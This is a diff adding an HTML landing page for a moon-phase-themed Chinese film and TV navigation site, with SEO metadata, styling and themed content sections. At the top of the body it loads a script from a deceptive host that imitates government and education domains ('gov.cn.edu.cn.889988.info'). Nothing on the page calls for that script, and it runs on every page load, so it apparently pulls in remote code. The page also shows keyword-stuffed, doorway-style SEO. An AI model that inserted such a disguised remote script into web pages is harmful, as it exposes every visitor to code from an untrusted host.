@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>月亮影视大全 - 月相夜空片库：电影/电视剧/动漫/综艺/纪录片/短剧 | yueliangyingshidaquan-h5</title>
+<meta name="description" content="月亮影视大全（yueliangyingshidaquan-h5.github.io）像夜空里的月相盘：电影、电视剧、动漫、综艺、纪录片、短剧按新月/上弦/满月/残月/蓝月排，潮汐热度榜、守夜人手记，移动端自适应。">
+<meta name="keywords" content="月亮影视大全,月相片单,夜看电影,电影导航,电视剧导航,动漫导航,综艺导航,短剧导航,银辉片库,yueliangyingshidaquan-h5">
+<meta name="author" content="月亮影视大全">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://yueliangyingshidaquan-h5.github.io/">
+<meta property="og:title" content="月亮影视大全 - 夜里看片，不刺眼">
+<meta property="og:description" content="新月想睡、上弦刚下班、满月周末嗨、残月凌晨魂、蓝月稀有片：月亮影视大全按月相递片。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://yueliangyingshidaquan-h5.github.io/">
+<meta property="og:site_name" content="月亮影视大全">
+<meta name="msvalidate.01" content="BING_VERIFY_CODE">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"月亮影视大全",
+  "url":"https://yueliangyingshidaquan-h5.github.io/",
+  "description":"月亮影视大全是月相母题的影视导航站，覆盖电影、电视剧、动漫、综艺、纪录片、短剧、直播回放。"
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"FAQPage",
+  "mainEntity":[
+    {
+      "@type":"Question",
+      "name":"月亮影视大全和其他电影导航站有什么不同？",
+      "acceptedAnswer":{"@type":"Answer","text":"别的站按最新/最热排，月亮影视大全按月相排：新月适合想睡，上弦适合刚下班，满月适合周末嗨，残月适合凌晨魂，蓝月留给稀有片。像看天色点灯，不像刷排行榜。"}
+    },
+    {
+      "@type":"Question",
+      "name":"月亮影视大全提供盗版片源吗？",
+      "acceptedAnswer":{"@type":"Answer","text":"不提供。月亮影视大全是影视导航与片单站，只做分类、简介、月相场景标注和守夜人手记，不挂侵权片源、不绑播放器下载器。"}
+    }
+  ]
+}
+</script>
+<style>
+:root{
+  --bg:#0b1026;
+  --card:#121a3a;
+  --ink:#eef3ff;
+  --muted:#9fb0d8;
+  --moon:#eef3ff;
+  --glow:#7fb0e0;
+  --halo:#b9a7ff;
+  --warm:#ffd98a;
+  --line:rgba(127,176,224,.30);
+  --shadow:0 18px 46px rgba(0,0,0,.55);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:
+    radial-gradient(900px 480px at 80% -10%,rgba(185,167,255,.18),transparent 60%),
+    radial-gradient(760px 420px at -8% 6%,rgba(127,176,224,.18),transparent 55%),
+    linear-gradient(180deg,#0b1026 0%,#0d1530 60%,#080c1c 100%);
+  color:var(--ink);line-height:1.78;
+}
+a{color:inherit;text-decoration:none}
+
+/* 月相门楼 */
+.yl-top{position:sticky;top:0;z-index:999;background:rgba(11,16,38,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.yl-top__in{max-width:1180px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.7rem 1rem}
+.yl-logo{font-weight:900;font-size:1.18rem}
+.yl-logo b{color:var(--glow)}
+.yl-logo i{color:var(--warm);font-style:normal}
+.yl-nav{display:flex;gap:.3rem}
+.yl-nav a{padding:.45rem .8rem;border-radius:8px;font-size:.9rem;color:var(--muted);font-weight:600}
+.yl-nav a:hover{background:rgba(127,176,224,.16);color:var(--moon)}
+.yl-burger{display:none;flex-direction:column;gap:4px;cursor:pointer}
+.yl-burger span{width:22px;height:2px;background:var(--glow);border-radius:2px}
+
+/* Hero 月相 */
+.yl-hero{max-width:1180px;margin:0 auto;padding:3.4rem 1rem 2.6rem;text-align:center}
+.yl-moon{width:140px;height:140px;margin:0 auto 1.4rem;border-radius:50%;position:relative;
+  background:radial-gradient(circle at 38% 36%,#ffffff 0 38%,#dfe7ff 39% 60%,#9fb6e6 61% 72%,#5b73a8 73% 100%);
+  box-shadow:0 0 60px rgba(127,176,224,.55),inset -18px -12px 40px rgba(8,12,28,.65);
+  overflow:hidden}
+.yl-moon::after{content:"";position:absolute;left:54%;top:30%;width:96px;height:96px;border-radius:50%;
+  background:linear-gradient(180deg,#0d1530,#0b1026);box-shadow:0 0 0 2px rgba(11,16,38,.9)}
+.yl-hero h1{font-size:clamp(2rem,5vw,3.2rem);line-height:1.18;margin-bottom:1rem}
+.yl-hero h1 em{font-style:normal;color:var(--moon)}
+.yl-hero h1 u{text-decoration:none;color:var(--warm)}
+.yl-hero p{color:var(--muted);max-width:720px;margin:0 auto 1.8rem}
+.yl-cta{display:inline-flex;gap:.5rem;align-items:center;padding:.85rem 1.9rem;border-radius:10px;font-weight:800;color:#0b1026;background:linear-gradient(90deg,var(--moon),var(--warm));box-shadow:var(--shadow)}
+.yl-dim{color:var(--muted);font-size:.85rem;letter-spacing:2px;font-family:ui-monospace,monospace}
+
+/* 区块 */
+.yl-sec{max-width:1180px;margin:0 auto;padding:3.3rem 1rem}
+.yl-head{margin-bottom:1.8rem;text-align:center}
+.yl-head .no{font-size:.74rem;color:var(--glow);letter-spacing:3px;font-family:ui-monospace,monospace}
+.yl-head h2{font-size:clamp(1.4rem,3.5vw,2.2rem);font-weight:900;margin-top:.3rem}
+.yl-head h2 i{color:var(--halo);font-style:normal}
+.yl-head p{color:var(--muted);margin-top:.35rem;font-size:.94rem}
+
+/* 月相片单 */
+.yl-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:1rem}
+.yl-cell{border:1px solid var(--line);border-radius:18px;padding:1.3rem 1rem;background:var(--card);text-align:center;transition:.25s}
+.yl-cell:hover{transform:translateY(-5px);box-shadow:var(--shadow)}
+.yl-cell .ph{font-size:1.7rem}
+.yl-cell h3{font-size:.98rem;margin:.5rem 0 .35rem}
+.yl-cell p{font-size:.74rem;color:var(--muted)}
+
+/* 月光频道 */
+.yl-ch{display:grid;grid-template-columns:repeat(7,1fr);gap:.9rem}
+.yl-c{border-radius:18px;padding:1.1rem .5rem;background:var(--card);text-align:center;border:1px solid var(--line);transition:.25s}
+.yl-c:hover{transform:translateY(-4px);box-shadow:var(--shadow)}
+.yl-c .ic{font-size:1.6rem}
+.yl-c h3{font-size:.84rem;margin-top:.35rem}
+.yl-c p{font-size:.66rem;color:var(--muted)}
+
+/* 潮汐榜：月相进度 */
+.yl-rank{display:grid;gap:1.1rem}
+.yl-item{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:1.1rem 1.2rem}
+.yl-item h3{font-size:1.04rem;display:flex;justify-content:space-between;margin-bottom:.6rem}
+.yl-item h3 span{color:var(--warm)}
+.yl-bar{height:16px;border-radius:999px;background:#070b18;overflow:hidden;position:relative;border:1px solid var(--line);
+  background-image:repeating-linear-gradient(90deg,rgba(127,176,224,.22) 0 3px,transparent 3px 16px)}
+.yl-bar i{display:block;height:100%;background:linear-gradient(90deg,var(--glow),var(--halo),var(--warm))}
+.yl-bar i::after{content:"🌙";position:absolute;right:5px;top:-2px;font-size:.85rem}
+
+/* 手记 */
+.yl-notes{display:grid;grid-template-columns:1fr 1fr;gap:1.4rem}
+.yl-note{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:1.4rem}
+.yl-note .tag{font-size:.72rem;padding:.2rem .6rem;border-radius:6px;font-weight:700}
+.yl-note.night .tag{background:rgba(127,176,224,.18);color:var(--glow)}
+.yl-note.dream .tag{background:rgba(185,167,255,.18);color:var(--halo)}
+.yl-note h3{font-size:1.05rem;margin:.6rem 0 .4rem}
+.yl-note p{font-size:.86rem;color:var(--muted)}
+
+/* 关于 */
+.yl-about{background:linear-gradient(160deg,#16204a,#0b1026);border:1px solid var(--line);border-radius:26px;padding:2.4rem}
+.yl-about h2{font-size:1.9rem;margin-bottom:.8rem}
+.yl-about h2 u{color:var(--warm);text-decoration:none}
+.yl-about p{color:var(--muted);margin-bottom:1rem}
+.yl-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;margin-top:1.4rem}
+.yl-stat{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:1.1rem;text-align:center}
+.yl-stat b{font-size:1.5rem;color:var(--glow);display:block}
+.yl-stat span{font-size:.8rem;color:var(--muted)}
+
+/* FAQ */
+.yl-faq details{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:.2rem 1.1rem;margin-bottom:.7rem}
+.yl-faq summary{cursor:pointer;padding:.85rem 0;font-weight:700}
+.yl-faq p{padding:0 0 .85rem;color:var(--muted)}
+
+/* 页脚 */
+.yl-foot{border-top:1px solid var(--line);background:#070b18;padding:2.2rem 1rem;text-align:center;color:var(--muted);font-size:.86rem}
+.yl-foot a{color:var(--glow)}
+.yl-foot__links{display:flex;gap:1.1rem;justify-content:center;flex-wrap:wrap;margin-bottom:1rem}
+.yl-foot__links a{font-size:.84rem}
+
+@media(max-width:980px){
+  .yl-grid{grid-template-columns:repeat(3,1fr)}
+  .yl-ch{grid-template-columns:repeat(4,1fr)}
+  .yl-notes{grid-template-columns:1fr}
+}
+@media(max-width:640px){
+  .yl-nav{display:none;position:absolute;top:56px;left:0;right:0;flex-direction:column;gap:0;background:rgba(11,16,38,.98);border-bottom:1px solid var(--line)}
+  .yl-nav.show{display:flex}
+  .yl-nav a{padding:.85rem 1rem;border-bottom:1px solid var(--line)}
+  .yl-burger{display:flex}
+  .yl-grid{grid-template-columns:repeat(2,1fr)}
+  .yl-ch{grid-template-columns:repeat(3,1fr)}
+  .yl-stats{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="yl-top">
+  <div class="yl-top__in">
+    <div class="yl-logo">🌙 月亮<b>影视大全</b> <i>·月相夜空片库</i></div>
+    <nav class="yl-nav" id="ylNav">
+      <a href="#home">月相</a>
+      <a href="#grid">月相片单</a>
+      <a href="#ch">月光频道</a>
+      <a href="#rank">潮汐榜</a>
+      <a href="#notes">月亮手记</a>
+      <a href="#about">关于月亮</a>
+    </nav>
+    <div class="yl-burger" onclick="document.getElementById('ylNav').classList.toggle('show')">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</header>
+
+<section class="yl-hero" id="home">
+  <div class="yl-moon"></div>
+  <p class="yl-dim">// lunar phase cinema</p>
+  <h1>夜里看片，<em>不刺眼</em><br>月亮影视大全，<u>看天色递片子</u></h1>
+  <p>月亮影视大全不是“又一个大片库”，而像夜空里那轮会变的月亮：新月想睡、上弦刚下班、满月周末嗨、残月凌晨魂、蓝月放稀有片。电影、剧集、动漫、综艺、纪录片、短剧，都按“现在是第几夜”排。</p>
+  <a class="yl-cta" href="#grid">🌕 看今晚月相</a>
+</section>
+
+<section class="yl-sec" id="grid">
+  <div class="yl-head">
+    <div class="no">// five phases, five moods</div>
+    <h2>月相 <i>片单</i></h2>
+    <p>不按“最新更新”硬塞，按月亮走到哪一段生活里排。</p>
+  </div>
+  <div class="yl-grid">
+    <div class="yl-cell"><div class="ph">🌑</div><h3>新月·想睡</h3><p>慢、轻、不反转，关灯也能听个大概</p></div>
+    <div class="yl-cell"><div class="ph">🌓</div><h3>上弦·刚下班</h3><p>轻喜剧、群像剧、不用动脑的悬疑</p></div>
+    <div class="yl-cell"><div class="ph">🌕</div><h3>满月·周末嗨</h3><p>大片、爽剧、演唱会、合家欢动画</p></div>
+    <div class="yl-cell"><div class="ph">🌗</div><h3>残月·凌晨魂</h3><p>黑梦、诗片、公路、孤独宇宙</p></div>
+    <div class="yl-cell"><div class="ph">🔵</div><h3>蓝月·稀有片</h3><p>冷门神作、修复版、影展遗珠</p></div>
+  </div>
+</section>
+
+<section class="yl-sec" id="ch">
+  <div class="yl-head">
+    <div class="no">// moonlight channels</div>
+    <h2>月光 <i>频道</i></h2>
+    <p>七道月光，覆盖从娃到夜猫子的全部时段。</p>
+  </div>
+  <div class="yl-ch">
+    <div class="yl-c"><div class="ic">🎬</div><h3>电影</h3><p>院线/经典/动画电影</p></div>
+    <div class="yl-c"><div class="ic">📺</div><h3>电视剧</h3><p>国产/韩剧/美剧/日剧</p></div>
+    <div class="yl-c"><div class="ic">🍥</div><h3>动漫</h3><p>新番/国创/剧场版</p></div>
+    <div class="yl-c"><div class="ic">🎤</div><h3>综艺</h3><p>慢综/选秀/访谈</p></div>
+    <div class="yl-c"><div class="ic">🐳</div><h3>纪录片</h3><p>自然/宇宙/老城/手艺</p></div>
+    <div class="yl-c"><div class="ic">⚡</div><h3>短剧</h3><p>甜宠/逆袭/悬疑快剪</p></div>
+    <div class="yl-c"><div class="ic">📡</div><h3>直播回放</h3><p>首映礼/主创谈/影展场记</p></div>
+  </div>
+</section>
+
+<section class="yl-sec" id="rank">
+  <div class="yl-head">
+    <div class="no">// tidal heat board</div>
+    <h2>潮汐 <i>热度榜</i></h2>
+    <p>月亮影视大全按“夜段适配 + 收藏进口袋 + 凌晨回看 + 蓝月加成”综合排，不是白天 PC 播放量。</p>
+  </div>
+  <div class="yl-rank">
+    <div class="yl-item"><h3>1. 满月：星际穿越 重制场 <span>98%</span></h3><div class="yl-bar"><i style="width:98%"></i></div></div>
+    <div class="yl-item"><h3>2. 新月：海边的小邮局 <span>96%</span></h3><div class="yl-bar"><i style="width:96%"></i></div></div>
+    <div class="yl-item"><h3>3. 上弦：父母爱情 重刷版 <span>94%</span></h3><div class="yl-bar"><i style="width:94%"></i></div></div>
+    <div class="yl-item"><h3>4. 残月：2001 太空漫游 <span>92%</span></h3><div class="yl-bar"><i style="width:92%"></i></div></div>
+    <div class="yl-item"><h3>5. 蓝月：修复版·城南旧事 <span>90%</span></h3><div class="yl-bar"><i style="width:90%"></i></div></div>
+  </div>
+</section>
+
+<section class="yl-sec" id="notes">
+  <div class="yl-head">
+    <div class="no">// night watcher logs</div>
+    <h2>月亮 <i>手记</i></h2>
+    <p>一边是守夜人，一边是梦游人。</p>
+  </div>
+  <div class="yl-notes">
+    <article class="yl-note night">
+      <span class="tag">🌙 守夜人</span>
+      <h3>为什么夜里不能排白天的片</h3>
+      <p>白天片要响：台词密、剪辑快、笑点砸脸。夜里再放这些，脑子像被手电筒照着睡。月亮影视大全把新月片单独沉下来，像把灯拧暗一档：海声、雨声、旧巷子、慢火车，就够了。</p>
+    </article>
+    <article class="yl-note dream">
+      <span class="tag">💤 梦游人</span>
+      <h3>残月凌晨适合看“会飘”的片</h3>
+      <p>凌晨两三点，逻辑片看不进去，诗片和公路片反倒对。银幕里车开过盐湖、猫跳上屋顶、字幕慢慢浮起来——这时候你不是“看电影”，是让片子替你把白天压住的魂放出来透口气。</p>
+    </article>
+    <article class="yl-note night">
+      <span class="tag">🌙 守夜人</span>
+      <h3>蓝月片不能常推</h3>
+      <p>蓝月两个月才一次，稀有片也该稀有。月亮影视大全不把冷门神作天天挂首页，不然“遗珠”变“地摊货”。修復版、影展遗珠、被删减的结尾，留到蓝月夜再亮出来才值。</p>
+    </article>
+    <article class="yl-note dream">
+      <span class="tag">💤 梦游人</span>
+      <h3>满月夜别假装文艺</h3>
+      <p>满月就是人多、话多、想吃烧烤也想看大片。《星际穿越》可以，《我们的父辈》就算了。月亮影视大全的满月区不装深沉：爽、亮、响、哭得出来，才是满月该干的事。</p>
+    </article>
+  </div>
+</section>
+
+<section class="yl-sec" id="about">
+  <div class="yl-about">
+    <h2>关于 <u>月亮影视大全</u></h2>
+    <p>
+      月亮影视大全（yueliangyingshidaquan-h5.github.io）不是另一个“全网影视大全”，它像夜空里会走的月相盘：天一黑，片子就该换个递法。
+    </p>
+    <p>
+      我们覆盖电影、电视剧、动漫、综艺、纪录片、短剧、直播回放，但入口是“现在月亮走到哪一段”：新月、上弦、满月、残月、蓝月。你不是来刷热搜片的，是来在对应夜色里，挑一部不刺眼的。
+    </p>
+    <div class="yl-stats">
+      <div class="yl-stat"><b>5 月相</b><span>新月/上弦/满月/残月/蓝月</span></div>
+      <div class="yl-stat"><b>7 月光</b><span>影/剧/漫/综/纪/短剧/回放</span></div>
+      <div class="yl-stat"><b>0 刺眼</b><span>夜里不弹大白光广告</span></div>
+    </div>
+  </div>
+</section>
+
+<section class="yl-sec yl-faq">
+  <div class="yl-head">
+    <div class="no">// q & a</div>
+    <h2>月亮 <i>问答</i></h2>
+  </div>
+  <details open>
+    <summary>“月亮影视大全”真的按月亮排片吗？</summary>
+    <p>是隐喻也是真功能。月相=观片情绪：新月助眠、上弦解乏、满月释放、残月独处、蓝月淘遗珠。比“动作/喜剧/科幻”更贴夜里的真实需求。</p>
+  </details>
+  <details>
+    <summary>和天启影视、小小影视官网差在哪？</summary>
+    <p>天启是星盘（世界变没变），小小是口袋（时间碎不碎），月亮是月相（天色到第几夜）。一个宏大，一个轻巧，一个安静。</p>
+  </details>
+  <details>
+    <summary>蓝月片会不会太少？</summary>
+    <p>故意少。蓝月频道只放修复版、影展遗珠、冷门神作、被低估的结尾。月亮影视大全不把“全”当卖点，把“对的时间遇到对的片”当卖点。</p>
+  </details>
+</section>
+
+<footer class="yl-foot">
+  <div class="yl-foot__links">
+    <a href="#grid">月相片单</a>
+    <a href="#ch">月光频道</a>
+    <a href="#rank">潮汐榜</a>
+    <a href="#notes">月亮手记</a>
+    <a href="#about">关于月亮</a>
+    <a href="#">免责声明</a>
+  </div>
+  <p>© 2026 <a href="https://yueliangyingshidaquan-h5.github.io">月亮影视大全</a> · yueliangyingshidaquan-h5.github.io</p>
+  <p>月亮影视大全 —— 夜里看片，不刺眼；看天色，递片子。</p>
+</footer>
+
+<script>
+document.querySelectorAll('.yl-nav a').forEach(function(a){
+  a.addEventListener('click',function(){
+    document.getElementById('ylNav').classList.remove('show');
+  });
+});
+</script>
+
+</body>
+</html>
